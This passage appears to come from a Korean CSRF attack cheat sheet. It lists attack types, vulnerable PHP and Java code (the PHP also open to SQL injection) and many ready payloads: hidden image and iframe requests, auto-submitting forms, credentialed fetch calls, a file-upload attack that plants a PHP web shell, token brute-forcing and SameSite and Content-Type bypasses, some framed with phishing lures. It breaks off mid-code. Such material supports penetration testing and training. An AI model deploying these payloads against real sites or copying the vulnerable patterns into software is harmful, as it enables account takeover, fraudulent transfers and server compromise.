### CSRF 공격 유형

#### 1.1. GET 기반 CSRF
- URL 파라미터를 통한 상태 변경
- 이미지 태그, 링크 등을 통한 자동 요청
- 이메일, 게시판 등에 악성 링크 삽입

#### 1.2. POST 기반 CSRF
- 숨겨진 폼을 통한 POST 요청
- JavaScript를 이용한 자동 폼 제출
- AJAX 요청을 통한 백그라운드 공격

#### 1.3. JSON/API 기반 CSRF
- REST API 엔드포인트 공격
- Content-Type 조작을 통한 우회
- CORS 정책 미흡 시 발생

### 공격 시나리오

#### 일반적인 CSRF 공격 시나리오:
1. **정찰**: 대상 사이트의 중요 기능 파악 (계정 변경, 송금 등)
2. **요청 분석**: HTTP 요청 구조 분석 및 필수 파라미터 확인
3. **페이로드 생성**: 악성 HTML/JavaScript 코드 작성
4. **유포**: 이메일, 게시판, 악성 사이트 등을 통해 배포
5. **실행**: 피해자가 링크 클릭 시 자동으로 공격 실행

### 일반적인 취약한 코드 패턴

#### 취약한 계정 정보 변경 (PHP):
```php
// 토큰 검증 없이 POST 요청만으로 계정 정보 변경
if ($_POST['action'] == 'change_password') {
    $new_password = $_POST['new_password'];
    $user_id = $_SESSION['user_id'];
    
    $query = "UPDATE users SET password = '$new_password' WHERE id = $user_id";
    mysql_query($query);
    echo "Password changed successfully";
}
```

#### 취약한 송금 기능 (Java):
```java
@PostMapping("/transfer")
public String transferMoney(@RequestParam int toAccount, 
                          @RequestParam double amount, 
                          HttpSession session) {
    int fromAccount = (Integer) session.getAttribute("userId");
    
    // CSRF 토큰 검증 없이 바로 실행
    bankService.transfer(fromAccount, toAccount, amount);
    return "Transfer completed";
}
```

---

## 2. 기본 페이로드

### 2.1. GET 기반 CSRF 공격

#### 2.1.1. 이미지 태그를 이용한 공격
```html
<!-- 계정 삭제 -->
<img src="http://target.com/delete_account?confirm=yes" width="0" height="0">

<!-- 비밀번호 변경 -->
<img src="http://target.com/change_password?new_password=hacked123" style="display:none">

<!-- 관리자 계정 생성 -->
<img src="http://target.com/admin/create_user?username=attacker&password=pass123&role=admin" hidden>

<!-- 설정 변경 -->
<img src="http://target.com/settings?email=attacker@evil.com&notifications=off">
```

#### 2.1.2. 링크를 이용한 공격
```html
<!-- 사용자 클릭 유도 -->
<a href="http://target.com/transfer?to=attacker&amount=1000">
    무료 상품 받기! 클릭하세요!
</a>

<!-- 자동 리다이렉트 -->
<script>
    window.location.href = "http://target.com/logout";
</script>

<!-- iframe을 이용한 숨김 공격 -->
<iframe src="http://target.com/delete_post?id=123" width="0" height="0" style="display:none"></iframe>
```

#### 2.1.3. 메타 태그를 이용한 자동 리다이렉트
```html
<meta http-equiv="refresh" content="0; url=http://target.com/dangerous_action?confirm=yes">
```

### 2.2. POST 기반 CSRF 공격

#### 2.2.1. 자동 폼 제출
```html
<!-- 기본 자동 제출 폼 -->
<form name="csrf_form" action="http://target.com/change_email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>
    document.csrf_form.submit();
</script>

<!-- 사용자 상호작용 후 제출 -->
<form id="hidden_form" action="http://target.com/transfer_money" method="POST">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<button onclick="document.getElementById('hidden_form').submit()">
    무료 쿠폰 받기!
</button>
```

#### 2.2.2. AJAX를 이용한 백그라운드 공격
```javascript
// XMLHttpRequest를 이용한 POST 요청
function csrfAttack() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://target.com/api/delete_account', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('confirm=yes&reason=user_request');
}

// Fetch API를 이용한 공격
fetch('http://target.com/api/change_role', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        user_id: 123,
        new_role: 'admin'
    }),
    credentials: 'include'  // 쿠키 포함
});

// jQuery를 이용한 공격
$.post('http://target.com/update_profile', {
    username: 'attacker',
    email: 'attacker@evil.com',
    role: 'admin'
});
```

### 2.3. 파일 업로드 CSRF

#### 2.3.1. multipart/form-data 폼
```html
<form action="http://target.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="file" value="malicious_file.php">
    <input type="hidden" name="description" value="Legitimate file">
    <input type="file" name="upload_file" style="display:none">
</form>

<script>
// 가짜 파일 데이터 생성
var form = document.querySelector('form');
var fileInput = document.querySelector('input[type="file"]');

// Blob을 이용한 가짜 파일 생성
var maliciousContent = '<?php system($_GET["cmd"]); ?>';
var blob = new Blob([maliciousContent], {type: 'text/plain'});
var file = new File([blob], 'shell.php', {type: 'text/plain'});

// DataTransfer를 이용해 파일 할당
var dataTransfer = new DataTransfer();
dataTransfer.items.add(file);
fileInput.files = dataTransfer.files;

form.submit();
</script>
```

### 2.4. 소셜 엔지니어링 연계 공격

#### 2.4.1. 이메일을 통한 공격
```html
<!-- HTML 이메일 내용 -->
<p>안녕하세요! 특별 혜택을 위해 아래 링크를 클릭해주세요.</p>
<a href="http://target.com/subscribe_premium?plan=yearly&auto_renew=true">
    프리미엄 1년 무료 사용하기
</a>

<!-- 숨겨진 CSRF 공격 -->
<img src="http://target.com/api/update_payment?card=1234567890123456&exp=12/25" 
     style="width:1px;height:1px;display:none">
```

#### 2.4.2. 게시판을 통한 공격
```html
<!-- 게시글에 삽입된 CSRF 코드 -->
<div>
    <h3>유용한 정보 공유합니다!</h3>
    <p>이 내용을 보시는 분들께 도움이 되었으면 합니다.</p>
    
    <!-- 보이지 않는 CSRF 공격 -->
    <iframe src="http://target.com/admin/delete_user?id=victim_id" 
            width="0" height="0" style="display:none"></iframe>
</div>
```

---

## 3. 특수 페이로드

### 3.1. CSRF 토큰 우회 기법

#### 3.1.1. 토큰 추측 및 브루트포스
```javascript
// 약한 토큰 생성 알고리즘 공격
function bruteForceToken() {
    var possibleTokens = [];
    
    // 시간 기반 토큰 추측
    var currentTime = Date.now();
    for (var i = -1000; i <= 1000; i++) {
        var timestamp = currentTime + i;
        var token = btoa(timestamp.toString()).substr(0, 16);
        possibleTokens.push(token);
    }
    
    // 각 토큰으로 요청 시도
    possibleTokens.forEach(function(token) {
        fetch('http://target.com/api/sensitive_action', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': token
            },
            body: JSON.stringify({action: 'malicious'}),
            credentials: 'include'
        });
    });
}
```

#### 3.1.2. 토큰 재사용 공격
```html
<!-- 동일 세션에서 토큰 재사용 -->
<form action="http://target.com/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="[이전에 획득한 유효한 토큰]">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to_account" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

#### 3.1.3. 토큰 누락 시 기본값 처리 악용
```javascript
// 토큰이 없을 때 기본 처리 로직 악용
fetch('http://target.com/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
        // CSRF 토큰 헤더 의도적으로 생략
    },
    body: JSON.stringify({
        action: 'delete_account'
    }),
    credentials: 'include'
});
```

### 3.2. SameSite 쿠키 우회

#### 3.2.1. 서브도메인을 이용한 우회
```html
<!-- target.com의 서브도메인에서 공격 -->
<!-- 만약 SameSite=Lax인 경우 -->
<form action="http://target.com/sensitive_action" method="GET">
    <input type="hidden" name="action" value="malicious">
</form>
<script>
    // GET 요청은 SameSite=Lax에서도 허용됨
    document.forms[0].submit();
</script>
```

#### 3.2.2. 팝업 윈도우를 이용한 우회
```javascript
// SameSite=None 쿠키가 있는 경우
function openAttackWindow() {
    var attackWindow = window.open('http://target.com/login', 'attack', 'width=1,height=1');
    
    setTimeout(function() {
        // 로그인 후 공격 실행
        attackWindow.location.href = 'http://target.com/delete_account?confirm=yes';
    }, 3000);
}

// 사용자 클릭 유도
document.body.innerHTML = '<button onclick="openAttackWindow()">특별 혜택 받기!</button>';
```

### 3.3. Content-Type 우회

#### 3.3.1. Simple Request 악용
```javascript
// CORS preflight 없는 요청 타입 사용
fetch('http://target.com/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'text/plain'  // Simple request
    },
    body: 'to_account=attacker&amount=10000',
    credentials: 'include'
});

// application/x-www-form-urlencoded 사용
fetch('http://target.com/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
